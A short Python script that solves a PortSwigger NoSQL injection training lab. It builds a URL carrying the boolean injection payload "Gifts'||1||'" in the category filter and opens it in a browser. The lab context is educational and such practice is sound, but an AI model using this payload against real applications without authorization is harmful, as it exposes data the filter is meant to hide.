import urllib.parse
import webbrowser

def solve_lab():
    print("This script will help you solve the PortSwigger NoSQL injection lab by opening a URL with the injection payload in your default browser.")
    print("Please make sure you have accessed the lab and are ready to solve it.")

    lab_url = input("Enter your lab URL (e.g., https://your-lab-id.web-security-academy.net): ").strip()

    # Ensure the URL ends with '/' if necessary
    if not lab_url.endswith('/'):
        lab_url += '/'

    payload = "Gifts'||1||'"
    encoded_payload = urllib.parse.quote(payload)
    full_url = lab_url + 'filter?category=' + encoded_payload

    print(f"Opening URL: {full_url}")
    webbrowser.open(full_url)

    print("Please check the lab status. If solved, you should see a notification.")

if __name__ == "__main__":
    solve_lab()
